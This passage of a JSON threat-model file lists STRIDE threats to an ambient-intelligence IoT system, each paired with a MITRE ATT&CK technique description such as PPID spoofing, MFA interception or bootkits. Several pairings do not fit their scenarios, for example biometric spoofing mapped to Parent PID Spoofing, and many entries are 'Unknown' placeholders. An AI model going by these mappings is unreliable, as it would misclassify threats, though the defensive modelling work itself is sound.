                    "Condition": "User devices store biometric data locally without additional encryption."
                },
                {
                    "Assumption": "Attacker has close physical proximity to the target user",
                    "Role": "Attacker",
                    "Condition": "Attacker can physically access the user or spoof biometric readings."
                },
                {
                    "Assumption": "The biometric system does not have multiple layers of verification",
                    "Role": "System Designer",
                    "Condition": "System relies solely on a single biometric factor."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive environments and personal data.",
            "MITRE ATT&CK Keywords": [
                "biometrics",
                "spoofing",
                "unauthorized access",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Parent PID Spoofing",
                "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
                "id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
                "technique_id": "T1134.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised hardware token to enter sensitive areas of the IoT environment.",
            "Assumptions": [
                {
                    "Assumption": "Hardware tokens are not regularly monitored or rotated",
                    "Role": "System Admin",
                    "Condition": "Tokens in use for an extended period without checks."
                },
                {
                    "Assumption": "Attacker has access to lost or stolen tokens",
                    "Role": "Attacker",
                    "Condition": "Tokens are lost or stolen and not reported immediately."
                },
                {
                    "Assumption": "System lacks robust two-factor authentication",
                    "Role": "System Designer",
                    "Condition": "Single-factor access through hardware tokens is used."
                }
            ],
            "Potential Impact": "Easy breach into high-security areas and potential manipulation of critical system controls.",
            "MITRE ATT&CK Keywords": [
                "hardware token",
                "physical access",
                "spoofing",
                "unauthorized entry"
            ],
            "mitre_technique": {
                "name": "Multi-Factor Authentication Interception",
                "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022)",
                "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
                "technique_id": "T1111"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Phishing attack to capture passwords and pins from users of the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Users may be unaware of phishing attempts",
                    "Role": "User",
                    "Condition": "Users lack proper awareness and training."
                },
                {
                    "Assumption": "Attacker can create convincing phishing emails or websites",
                    "Role": "Attacker",
                    "Condition": "Attackers have the resources to mimic legitimate sources convincingly."
                },
                {
                    "Assumption": "System does not employ multi-factor authentication",
                    "Role": "System Designer",
                    "Condition": "System relies on passwords and pins without additional layers of security."
                }
            ],
            "Potential Impact": "Compromise of user credentials leading to unauthorized system access and data breaches.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential theft",
                "spoofing",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker alters sensor data to mislead the system and trigger unintended actions.",
            "Assumptions": [
                {
                    "Assumption": "Sensors lack secure communication channels",
                    "Role": "System Designer",
                    "Condition": "Sensor data is transmitted unencrypted or over insecure networks."
                },
                {
                    "Assumption": "Attacker has access to communication networks or sensor hardware",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to sensor networks."
                },
                {
                    "Assumption": "System does not implement data integrity checks",
                    "Role": "System Admin",
                    "Condition": "Data is accepted from sensors without verification."
                }
            ],
            "Potential Impact": "Disruption of system operations and incorrect environmental adaptation.",
            "MITRE ATT&CK Keywords": [
                "sensor tampering",
                "data integrity",
                "network manipulation",
                "actuator control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware injection into the AI/ML models used for decision making in the IoT environment.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML models are uploaded without thorough validation",
                    "Role": "System Designer",
                    "Condition": "Models are integrated without checks for malicious modifications."
                },
                {
                    "Assumption": "Attackers can access model training data or deployment system",
                    "Role": "Attacker",
                    "Condition": "Weak access controls on model storage facilities."
                },
                {
                    "Assumption": "The system lacks proper logging and alerting mechanisms",
                    "Role": "System Admin",
                    "Condition": "No comprehensive monitoring of AI/ML model interactions."
                }
            ],
            "Potential Impact": "Unreliable system behavior leading to incorrect decisions and potential system failure.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "AI/ML model tampering",
                "system corruption",
                "data poisoning"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromise of data repositories to alter historical data and profiles.",
            "Assumptions": [
                {
                    "Assumption": "Databases are not properly secured against unauthorized modifications",
                    "Role": "System Admin",
                    "Condition": "Lack of robust access control and encryption."
                },
                {
                    "Assumption": "Attackers have obtained valid credentials for data access",
                    "Role": "Attacker",
                    "Condition": "Data credentials are stolen or leaked."
                },
                {
                    "Assumption": "Changes to data go unnoticed due to inadequate logging",
                    "Role": "System Admin",
                    "Condition": "Inadequate or non-existent auditing of data changes."
                }
            ],
            "Potential Impact": "Altered historical data could bias system learning and user experience personalization.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "data alteration",
                "corruption of historical data",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User denies performing actions that triggered system responses in the IoT environment.",
            "Assumptions": [
                {
                    "Assumption": "System does not log user actions and interactions",
                    "Role": "System Designer",
                    "Condition": "System lacks detailed logging and audit trails."
                },
                {
                    "Assumption": "Discrepancies in the log data are not regularly checked",
                    "Role": "System Admin",
                    "Condition": "Weak log management and analysis practices."
                },
                {
                    "Assumption": "Users are able to claim actions of others",
                    "Role": "User",
                    "Condition": "Inadequate user behavior and interaction attribution mechanisms."
                }
            ],
            "Potential Impact": "Difficulties in accountability, leading to potential misuse and trust issues within the system.",
            "MITRE ATT&CK Keywords": [
                "activity repudiation",
                "logging faults",
                "accountability issues",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Third-party service integration challenges where actions performed via these services are denied.",
            "Assumptions": [
                {
                    "Assumption": "Third-party services are not properly authenticated",
                    "Role": "System Designer",
                    "Condition": "Lack of strong authentication with third-party integrations."
                },
                {
                    "Assumption": "Actions performed by third parties are not logged with appropriate contexts",
                    "Role": "System Admin",
                    "Condition": "Logging lacks the details to attribute actions correctly."
                },
                {
                    "Assumption": "Third-party integrations are numerous and complex",
                    "Role": "System Designer",
                    "Condition": "Limited oversight on all third-party interactions with the system."
                }
            ],
            "Potential Impact": "Misattribution of actions leading to security vulnerabilities and operational issues.",
            "MITRE ATT&CK Keywords": [
                "third-party interactions",
                "integration repudiation",
                "service accountability",
                "action logging"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operator actions are misattributed leading to operational errors and denial of involvement.",
            "Assumptions": [
                {
                    "Assumption": "Operator credentials are shared or poorly managed",
                    "Role": "System Admin",
                    "Condition": "Credentials are not kept secure or are shared among multiple operators."
                },
                {
                    "Assumption": "Logging does not capture granular details of operations",
                    "Role": "System Designer",
                    "Condition": "Logs only capture high-level actions without details of operator identities."
                },
                {
                    "Assumption": "Operators have the ability to override or alter logs",
                    "Role": "System Admin",
                    "Condition": "Privilege settings allow operators to modify logs."
                }
            ],
            "Potential Impact": "Challenges in isolating the cause of errors and attributing responsibility for malicious activities.",
            "MITRE ATT&CK Keywords": [
                "operator actions",
                "logging tampering",
                "misattribution",
                "operational errors"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leakage from sensors capturing sensitive user data like biometrics.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data is transmitted unencrypted",
                    "Role": "System Designer",
                    "Condition": "Data sent over networks without encryption measures."
                },
                {
                    "Assumption": "Attackers can intercept communication channels",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to communication channels around sensors."
                },
                {
                    "Assumption": "High-value environments like healthcare facilities are targeted",
                    "Role": "System User",
                    "Condition": "Sensitive data environments increase attractiveness for attacks."
                }
            ],
            "Potential Impact": "Unauthorized exposure of sensitive user data leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "sensor data leakage",
                "information disclosure",
                "biometrics theft",
                "user privacy"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromise of communication infrastructure leading to unauthorized access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Communication infrastructure lacks robust encryption",
                    "Role": "System Designer",
                    "Condition": "Data transmission and storage are not encrypted."
                },
                {
                    "Assumption": "Network access controls are weak or poorly configured",
                    "Role": "System Admin",
                    "Condition": "Poor implementation of access control measures on the network."
                },
                {
                    "Assumption": "Regular security assessments and updates are not conducted",
                    "Role": "System Admin",
                    "Condition": "Infrequent assessment and upgrading of the network security posture."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data and network intelligence.",
            "MITRE ATT&CK Keywords": [
                "network compromise",
                "communication infrastructure breach",
                "sensitive data leak",
                "network access control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of sensitive data stored in cloud repositories due to misconfiguration.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage permissions are not properly configured",
                    "Role": "System Admin",
                    "Condition": "Misconfigured access controls on cloud storage platforms."
                },
                {
                    "Assumption": "Attackers have the capability to scan and exploit open storage",
                    "Role": "Attacker",
                    "Condition": "Using scanning tools to identify and exploit misconfigured cloud storage."
                },
                {
                    "Assumption": "Sensitive data is stored in plaintext within the cloud systems",
                    "Role": "System Designer",
                    "Condition": "Data is not encrypted before storage in the cloud."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user records and configuration data.",
            "MITRE ATT&CK Keywords": [
                "cloud data breaches",
                "misconfiguration",
                "sensitive data exposure",
                "cloud storage compromise"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Network-based DDoS attack targeting the communication infrastructure of the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not protected against high-volume attacks",
                    "Role": "System Designer",
                    "Condition": "Lack of DDoS mitigation mechanisms."
                },
                {
                    "Assumption": "Attackers have sufficient resources to launch large-scale DDoS attacks",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or vast distributed networks for attack execution."
                },
                {
                    "Assumption": "Alerts and mitigations for DDoS attacks are not adequately set up",
                    "Role": "System Admin",
                    "Condition": "Inadequate real-time monitoring and response capabilities."
                }
            ],
            "Potential Impact": "System downtime, loss of communication, and service interruption.",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "communication disruption",
                "network congestion",
                "service unavailability"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware updates to actuators rendering them non-functional.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not verified before installation",
                    "Role": "System Admin",
                    "Condition": "Automatic or unverified updates are enabled."
                },
                {
                    "Assumption": "Attackers have access to the update distribution mechanism",
                    "Role": "Attacker",
                    "Condition": "Control over the firmware distribution channel."
                },
                {
                    "Assumption": "Rollback mechanisms and alternative means of actuator control are absent",
                    "Role": "System Designer",
                    "Condition": "No contingency plan for faulty updates."
                }
            ],
            "Potential Impact": "Physical disruption due to malfunctioning actuators leading to system failures.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "actuator failure",
                "malicious updates",
                "physical disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in device interfaces causing system crashes.",
            "Assumptions": [
                {
                    "Assumption": "Devices have no or outdated security patches",
                    "Role": "System Admin",
                    "Condition": "Lack of timely updates and patches for known vulnerabilities."
                },
                {
                    "Assumption": "Attackers can discover and exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Utilization of tools and knowledge to identify and exploit system flaws."
                },
                {
                    "Assumption": "System lacks robust intrusion detection and prevention systems",
                    "Role": "System Designer",
                    "Condition": "Weak or absent measures to detect and block malicious activities."
                }
            ],
            "Potential Impact": "Permanent or temporary system inaccessibility, rendering functionalities unavailable to users.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "device crashes",
                "system interface",
                "service denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized users gain administrative access through privilege escalation via unpatched software vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Critical software vulnerabilities remain unpatched",
                    "Role": "System Admin",
                    "Condition": "Failure to update software with security patches."
                },
                {
                    "Assumption": "Attackers have local access to the system or network",
                    "Role": "Attacker",
                    "Condition": "Physical or remote initial access."
                },
                {
                    "Assumption": "System does not implement comprehensive privilege controls",
                    "Role": "System Designer",
                    "Condition": "Limited use of least privilege principles."
                }
            ],
            "Potential Impact": "Full control over system configurations and data leading to potential widespread damage.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "unpatched vulnerabilities",
                "administrative access",
                "full system control"
            ],
            "mitre_technique": {
                "name": "Device Driver Discovery",
                "description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)",
                "id": "attack-pattern--215d9700-5881-48b8-8265-6449dbb7195d",
                "technique_id": "T1652"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware that exploits firmware vulnerabilities to gain system-level access.",
            "Assumptions": [
                {
                    "Assumption": "Firmware has exploitable vulnerabilities",
                    "Role": "System Admin",
                    "Condition": "Outdated or insecure firmware in use."
                },
                {
                    "Assumption": "Attackers can execute malware on the target devices",
                    "Role": "Attacker",
                    "Condition": "Deployment of malware via delivery methods like phishing or compromised updates."
                },
                {
                    "Assumption": "System lacks adequate malware detection and prevention mechanisms",
                    "Role": "System Designer",
                    "Condition": "Insufficient use of advanced malware detection systems."
                }
            ],
            "Potential Impact": "Compromise of entire system operations and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "firmware vulnerabilities",
                "malware",
                "system access",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of misconfigured cloud settings to gain higher-level access in the AmI environment.",
            "Assumptions": [
                {
                    "Assumption": "Cloud settings are improperly managed or reviewed",
                    "Role": "System Admin",
                    "Condition": "Cloud configurations are not kept secure or regularly assessed."
                },
                {
                    "Assumption": "Attackers have the ability to probe and exploit weak configurations",
                    "Role": "Attacker",
                    "Condition": "Use of cloud security testing tools and techniques."
                },
                {
                    "Assumption": "Robust access controls and auditing are not enforced on cloud assets",
